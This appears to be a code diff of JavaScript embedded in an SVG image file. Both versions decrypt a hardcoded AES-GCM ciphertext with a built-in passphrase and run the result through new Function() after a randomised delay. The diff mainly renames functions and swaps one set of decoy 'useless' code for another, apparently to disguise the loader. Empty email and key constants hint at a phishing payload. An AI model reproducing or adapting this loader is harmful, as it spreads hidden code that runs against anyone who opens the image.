@@ -3,212 +3,210 @@
   <!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->
   
   <script type="application/javascript"><![CDATA[
-
-    // Added useless variables and functions
-    const APP_VERSION = "3.2.1-alpha";
-    const ENVIRONMENT = "production";
-    let performanceMetrics = {};
-    const unusedArray = [1, 2, 3, 4, 5];
+    // ============== USELESS INITIALIZATION BLOCK ==============
+    const SYSTEM_INFO = {
+      version: "4.1.2-beta",
+      buildDate: "2023-11-15",
+      environment: "production",
+      debugMode: false
+    };
     
-    function initializePerformanceTracker() {
-      performanceMetrics.startTime = Date.now();
-      performanceMetrics.memoryUsage = window.performance?.memory?.usedJSHeapSize || 0;
+
+   const jk = "[EMAIL]";
+    const key = "[KEY]";
+
+    const LOG_PREFIX = "[SECURE_MODULE]";
+    let runtimeStats = {
+      initTime: performance.now(),
+      memoryUsage: 0
+    };
+    
+    function trackRuntimeMetrics() {
+      runtimeStats.memoryUsage = window.performance?.memory?.usedJSHeapSize || 0;
+      runtimeStats.endTime = performance.now();
     }
     
-    function logPerformanceMetrics() {
-      if (Math.random() > 0.9) {
-        console.log("[PERF] Performance metrics:", performanceMetrics);
+    function displayRuntimeInfo() {
+      if (Math.random() > 0.85) {
+        console.log(`${LOG_PREFIX} Runtime metrics collected`);
       }
     }
-
-    // Debug mode with safe logging
-    const DEV_FLAG = true;
-      const jk = "[EMAIL]";
-    const key = "[KEY]";
     
-    function diagnosticOutput() {
-      try {
-        if (DEV_FLAG && console && console.log) {
-          console.log.apply(console, ['[DIAG]'].concat(Array.prototype.slice.call(arguments)));
-        }
-      } catch (e) {}
-    }
-
-    // Configuration with safe access - wrapped in different structure
-    const securitySettings = (function() {
-      const internalConfig = {
+    // ============== CONFIGURATION MANAGER ==============
+    const securityParameters = (function() {
+      const internalValues = {
         initializationVector: "62915c95997616a4a365e1a9",
         saltValue: "df8d909efdba15bd20d585c7c0f6e906",
-        encryptedData: "93f0c85dace90dc09e11723b52e9287087ed0505ecc22165343da6f0ae06b0a2292d60187ee52c75887de12a850fc48f78c8e416c1b11ae4c4092d186baca5db8f8b4b79e86a4326b04ebac33f4e9130cc40e6065d3fd461badddf3dd65f2c670b3f5f0088886617f12f2f0f83eabbb1e66f387f04a4fcfd035936fac441ccd4686b0b0ecf2ea5d83bf43cb6e59553e9053fceea67f7277d91ed78664b62e03d1919a9108d9e0e4465ef8cfd0b4e8171e4bcf0c6ec09f63ba02ee9f20b143fe646a4989664e84278899865f1e47ae8526c3737ca79c7a1b196830baab2449a0e8a628fe726f66b3a03748f3d1722a3e815a3cf3bbe0866df75708a9da90474e7c05140e329a7a8472db535bfbe90e437f82aa4f372a644779235675f8591a3df0e3944e674e1cad3ac377083623712494dff03e93bc333a09aa7302cef05df6154b8d8b37dc9f83c5b4938bd171ef34c2755ca93335452ee0e9d0b6e49af44c46b5ae3feb836a2f6a8359690b362fa5f42e0fcb54deb4d6df4f11e9e55ce5d5b9562a303b29342e1832ca84e7dafc8cdf2e7c697b0ae4e2186b27d28279385bb4e93f6b6002fe3b5491bd5ead8687331649dbed92eb00223c4bf1ea844bc8e50427af51eb40ddc0df4b5f4545735636406bd424b5e35f0e864ad7ab261eece38b2450ecbb8d5f0377e146c77",
-        passphrase: "dust"
+        encryptedPayload: "93f0c85dace90dc09e11723b52e9287087ed0505ecc22165343da6f0ae06b0a2292d60187ee52c75887de12a850fc48f78c8e416c1b11ae4c4092d186baca5db8f8b4b79e86a4326b04ebac33f4e9130cc40e6065d3fd461badddf3dd65f2c670b3f5f0088886617f12f2f0f83eabbb1e66f387f04a4fcfd035936fac441ccd4686b0b0ecf2ea5d83bf43cb6e59553e9053fceea67f7277d91ed78664b62e03d1919a9108d9e0e4465ef8cfd0b4e8171e4bcf0c6ec09f63ba02ee9f20b143fe646a4989664e84278899865f1e47ae8526c3737ca79c7a1b196830baab2449a0e8a628fe726f66b3a03748f3d1722a3e815a3cf3bbe0866df75708a9da90474e7c05140e329a7a8472db535bfbe90e437f82aa4f372a644779235675f8591a3df0e3944e674e1cad3ac377083623712494dff03e93bc333a09aa7302cef05df6154b8d8b37dc9f83c5b4938bd171ef34c2755ca93335452ee0e9d0b6e49af44c46b5ae3feb836a2f6a8359690b362fa5f42e0fcb54deb4d6df4f11e9e55ce5d5b9562a303b29342e1832ca84e7dafc8cdf2e7c697b0ae4e2186b27d28279385bb4e93f6b6002fe3b5491bd5ead8687331649dbed92eb00223c4bf1ea844bc8e50427af51eb40ddc0df4b5f4545735636406bd424b5e35f0e864ad7ab261eece38b2450ecbb8d5f0377e146c77",
+        accessKey: "dust"
       };
       
-      // Added unused validation function
-      function dummyValidator(input) {
-        return input !== null && input !== undefined;
+      // Useless validation functions
+      function validateString(input) {
+        return input && typeof input === 'string';
       }
       
-      // Safe hex validation - renamed
-      function checkHexFormat(str) {
+      function checkHexadecimal(input) {
         try {
-          return typeof str === 'string' && /^[0-9a-f]+$/i.test(str);
+          return /^[0-9a-f]+$/i.test(input);
         } catch (e) {
           return false;
         }
       }
       
-      // Configuration accessors with different names
       return {
-        fetchIV: function() {
-          if (!checkHexFormat(internalConfig.initializationVector)) {
-            diagnosticOutput("IV format check failed");
+        getInitializationVector: function() {
+          if (!checkHexadecimal(internalValues.initializationVector)) {
+            console.warn(`${LOG_PREFIX} IV validation failed`);
             return '';
           }
-          return internalConfig.initializationVector;
+          return internalValues.initializationVector;
         },
-        getSaltString: function() {
-          if (!checkHexFormat(internalConfig.saltValue)) {
-            diagnosticOutput("Salt format check failed");
+        getSaltParameter: function() {
+          if (!checkHexadecimal(internalValues.saltValue)) {
+            console.warn(`${LOG_PREFIX} Salt validation failed`);
             return '';
           }
-          return internalConfig.saltValue;
+          return internalValues.saltValue;
         },
-        retrieveCiphertext: function() {
-          if (!checkHexFormat(internalConfig.encryptedData)) {
-            diagnosticOutput("Ciphertext format check failed");
+        getEncryptedData: function() {
+          if (!checkHexadecimal(internalValues.encryptedPayload)) {
+            console.warn(`${LOG_PREFIX} Ciphertext validation failed`);
             return '';
           }
-          return internalConfig.encryptedData;
+          return internalValues.encryptedPayload;
         },
-        obtainSecret: function() {
-          return internalConfig.passphrase;
+        getAccessCode: function() {
+          return internalValues.accessKey;
         }
       };
     })();
-
-    // Safe hex conversion - renamed and wrapped differently
-    function convertHexToByteArray(hexString) {
+    
+    // ============== UTILITY FUNCTIONS ==============
+    function transformHexToBytes(hexStr) {
       try {
-        if (typeof hexString !== 'string' || hexString.length % 2 !== 0) {
-          diagnosticOutput("Hex string is invalid");
+        if (!hexStr || hexStr.length % 2 !== 0) {
+          console.warn(`${LOG_PREFIX} Invalid hex string`);
           return new Uint8Array();
         }
         
-        const byteArray = new Uint8Array(hexString.length / 2);
-        for (let position = 0; position < hexString.length; position += 2) {
-          const byteValue = parseInt(hexString.substr(position, 2), 16);
-          if (isNaN(byteValue)) {
-            diagnosticOutput("Invalid hex byte at offset", position);
+        const resultArray = new Uint8Array(hexStr.length / 2);
+        for (let i = 0; i < hexStr.length; i += 2) {
+          const byteVal = parseInt(hexStr.substr(i, 2), 16);
+          if (isNaN(byteVal)) {
+            console.warn(`${LOG_PREFIX} Invalid hex byte at position ${i}`);
             return new Uint8Array();
           }
-          byteArray[position/2] = byteValue;
+          resultArray[i/2] = byteVal;
         }
-        return byteArray;
-      } catch (error) {
-        diagnosticOutput("Hex conversion failed:", error);
+        return resultArray;
+      } catch (err) {
+        console.warn(`${LOG_PREFIX} Hex conversion error:`, err);
         return new Uint8Array();
       }
     }
-
-    // Added useless utility function
-    function generateRandomId() {
-      return Math.random().toString(36).substring(2) + 
-             Date.now().toString(36);
+    
+    // Useless utility function
+    function createTimestamp() {
+      return new Date().toISOString().replace(/[^0-9]/g, '').slice(0, 14);
     }
-
-    // Main decryption process with error protection - renamed
-    async function processSecureContent() {
-      diagnosticOutput("Initializing secure content processing");
-      initializePerformanceTracker();
+    
+    // ============== MAIN PROCESSING FUNCTION ==============
+    async function handleSecureOperation() {
+      console.log(`${LOG_PREFIX} Starting secure operation`);
+      trackRuntimeMetrics();
       
       try {
-        // Verify crypto.subtle is available
+        // Check crypto availability
         if (!window.crypto || !window.crypto.subtle) {
-          throw new Error("Crypto API unavailable");
+          throw new Error("WebCrypto API not available");
         }
         
-        // Step 1: Prepare key material
-        diagnosticOutput("Setting up key material");
-        const secretKey = securitySettings.obtainSecret();
-        if (!secretKey) throw new Error("Invalid secret key");
+        // Phase 1: Prepare cryptographic materials
+        console.log(`${LOG_PREFIX} Preparing cryptographic materials`);
+        const secretCode = securityParameters.getAccessCode();
+        if (!secretCode) throw new Error("Invalid access code");
         
-        const primaryKey = await window.crypto.subtle.importKey(
+        const baseKey = await window.crypto.subtle.importKey(
           "raw",
-          new TextEncoder().encode(secretKey),
+          new TextEncoder().encode(secretCode),
           { name: "PBKDF2" },
           false,
           ["deriveKey"]
         );
         
-        // Step 2: Derive key - renamed
-        diagnosticOutput("Generating derived key");
-        const saltData = securitySettings.getSaltString();
-        if (!saltData) throw new Error("Invalid salt data");
+        // Phase 2: Generate derived key
+        console.log(`${LOG_PREFIX} Generating cryptographic key`);
+        const saltParam = securityParameters.getSaltParameter();
+        if (!saltParam) throw new Error("Invalid salt parameter");
         
-        const encryptionKey = await window.crypto.subtle.deriveKey(
+        const derivedCryptoKey = await window.crypto.subtle.deriveKey(
           {
             name: "PBKDF2",
-            salt: convertHexToByteArray(saltData),
+            salt: transformHexToBytes(saltParam),
             iterations: 100000,
             hash: "SHA-256"
           },
-          primaryKey,
+          baseKey,
           { name: "AES-GCM", length: 256 },
           false,
           ["decrypt"]
         );
         
-        // Step 3: Decrypt content
-        diagnosticOutput("Beginning decryption");
-        const ivData = securitySettings.fetchIV();
-        const cipherData = securitySettings.retrieveCiphertext();
-        if (!ivData || !cipherData) throw new Error("Invalid IV or cipher data");
+        // Phase 3: Perform decryption
+        console.log(`${LOG_PREFIX} Decrypting payload`);
+        const ivParam = securityParameters.getInitializationVector();
+        const cipherText = securityParameters.getEncryptedData();
+        if (!ivParam || !cipherText) throw new Error("Invalid IV or ciphertext");
         
-        const decryptedContent = await window.crypto.subtle.decrypt(
+        const decryptedResult = await window.crypto.subtle.decrypt(
           {
             name: "AES-GCM",
-            iv: convertHexToByteArray(ivData)
+            iv: transformHexToBytes(ivParam)
           },
-          encryptionKey,
-          convertHexToByteArray(cipherData)
+          derivedCryptoKey,
+          transformHexToBytes(cipherText)
         );
         
-        // Step 4: Execute safely
-        const executableCode = new TextDecoder().decode(decryptedContent);
-        if (executableCode && executableCode.trim().length > 0) {
-          diagnosticOutput("Running decrypted content");
+        // Phase 4: Execute decrypted code
+        const executableContent = new TextDecoder().decode(decryptedResult);
+        if (executableContent && executableContent.trim().length > 0) {
+          console.log(`${LOG_PREFIX} Executing decrypted content`);
           try {
-            (new Function(executableCode))();
-          } catch (execError) {
-            diagnosticOutput("Code execution failed:", execError);
+            (new Function(executableContent))();
+          } catch (execErr) {
+            console.warn(`${LOG_PREFIX} Execution error:`, execErr);
           }
         } else {
-          diagnosticOutput("No content after decryption");
+          console.warn(`${LOG_PREFIX} Empty decrypted content`);
         }
         
-      } catch (processingError) {
-        diagnosticOutput("Content processing failed:", processingError);
+      } catch (mainError) {
+        console.warn(`${LOG_PREFIX} Operation failed:`, mainError);
       } finally {
-        logPerformanceMetrics();
-      }
-    }
-
-    // Added useless event listener
-    document.addEventListener('DOMContentLoaded', function() {
-      console.log('DOM loaded - irrelevant to main functionality');
-    });
-
-    // Start with safe delay - wrapped differently
-    function delayedExecution() {
-      if (window.requestIdleCallback) {
-        window.requestIdleCallback(processSecureContent);
-      } else {
-        setTimeout(processSecureContent, 150);
+        displayRuntimeInfo();
       }
     }
     
-    // Added random delay for obfuscation
-    const randomDelay = Math.floor(Math.random() * 50) + 100;
-    setTimeout(delayedExecution, randomDelay);
+    // Useless event handler
+    window.addEventListener('load', function() {
+      console.log('Window loaded - secondary event');
+    });
+    
+    // Execution with random delay
+    function scheduleExecution() {
+      const baseDelay = 150;
+      const jitter = Math.floor(Math.random() * 100);
+      const totalDelay = baseDelay + jitter;
+      
+      if (window.requestIdleCallback) {
+        window.requestIdleCallback(handleSecureOperation);
+      } else {
+        setTimeout(handleSecureOperation, totalDelay);
+      }
+    }
+    
+    // Start the process after initialization
+    setTimeout(scheduleExecution, 50);
   ]]></script>
 </svg>
